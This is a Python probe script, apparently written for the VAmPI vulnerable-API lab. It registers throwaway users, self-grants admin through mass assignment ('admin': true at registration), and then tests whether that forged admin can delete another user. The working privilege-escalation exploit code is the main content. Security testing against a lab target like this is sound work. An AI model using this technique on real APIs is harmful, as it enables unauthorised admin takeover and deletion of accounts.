#!/usr/bin/env python3
"""
vampi_challenge_10_privilege_escalation_delete.py — Privilege escalation.

DELETE /users/v1/{username} is "Only Admins". Two probes:
  1. A NON-ADMIN user tries to delete a (throwaway) victim  -> should be 401.
  2. A mass-assigned (throwaway) ADMIN deletes the same victim -> if 200, the
     self-granted admin really has delete privilege (mass-assignment + broken
     access control).

Both the attacker-admin and the victim are throwaway accounts, so no seeded
user is ever deleted. Safe to re-run.
Run: python3 vampi_challenge_10_privilege_escalation_delete.py [--config ...]
"""
import argparse
import os
import sys

import requests

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import vampi_common as vc


def find_config():
    if os.path.exists("vampi_config.yaml"):
        return "vampi_config.yaml"
    return os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "vampi_config.yaml")


def register(base, username, password, admin, tout, idx):
    payload = {"username": username, "password": password, "email": vc.rand_email(username)}
    if admin:
        payload["admin"] = True
    r = requests.post(f"{base}/users/v1/register", json=payload,
                      headers={**vc.consumer_headers(idx), "Content-Type": "application/json"}, timeout=tout)
    return r.status_code


def main():
    ap = argparse.ArgumentParser(description="Privilege escalation: delete user as non-admin vs mass-assigned admin")
    ap.add_argument("--config", default=find_config())
    args = ap.parse_args()

    cfg = vc.load_config(args.config)
    base = vc.base_url(cfg)
    tout = vc.timeout(cfg)
    nonadmin = vc.known_users(cfg)[0]

    # Throwaway victim (safe to delete).
    victim = vc.rand_username("vict")
    victim_pw = "Victim123!"
    code = register(base, victim, victim_pw, False, tout, 811)
    print(f"register throwaway victim '{victim}' -> HTTP {code}")

    # Probe 1: NON-ADMIN tries to delete the victim -> expect 401.
    tok = vc.login(base, nonadmin["username"], nonadmin["password"], vc.consumer_headers(811), tout)
    if tok:
        r = requests.delete(f"{base}/users/v1/{victim}", headers=vc.auth_headers(tok), timeout=tout)
        print(f"probe 1   DELETE as NON-ADMIN {nonadmin['username']:<12} -> HTTP {r.status_code} {'[DENIED-as-expected]' if r.status_code == 401 else ''}")
    else:
        print("probe 1   (non-admin login failed)")

    # Probe 2: mass-assigned ADMIN deletes the victim.
    massadmin = vc.rand_username("massdel")
    mass_pw = "MassAdmin123!"
    register(base, massadmin, mass_pw, True, tout, 812)
    tok = vc.login(base, massadmin, mass_pw, vc.consumer_headers(812), tout)
    if tok:
        me = requests.get(f"{base}/me", headers=vc.auth_headers(tok), timeout=tout)
        is_admin = (me.json() or {}).get("data", {}).get("admin") if me.status_code == 200 else None
        r = requests.delete(f"{base}/users/v1/{victim}", headers=vc.auth_headers(tok), timeout=tout)
        print(f"probe 2   DELETE as MASS-ADMIN {massadmin:<12} -> HTTP {r.status_code} (self admin={is_admin})")
        if r.status_code == 200:
            # Confirm the victim is actually gone.
            gone = requests.get(f"{base}/users/v1/{victim}", headers=vc.consumer_headers(813), timeout=tout).status_code
            print(f"  victim GET after delete -> HTTP {gone} ({'deleted' if gone == 404 else 'still present'})")
            print("[FINDING] self-assigned admin deleted another user (mass assignment + broken access control).")
        else:
            print("[ok] mass-assigned admin was not permitted to delete the user.")
    else:
        print("probe 2   (mass-admin login failed)")


if __name__ == "__main__":
    main()
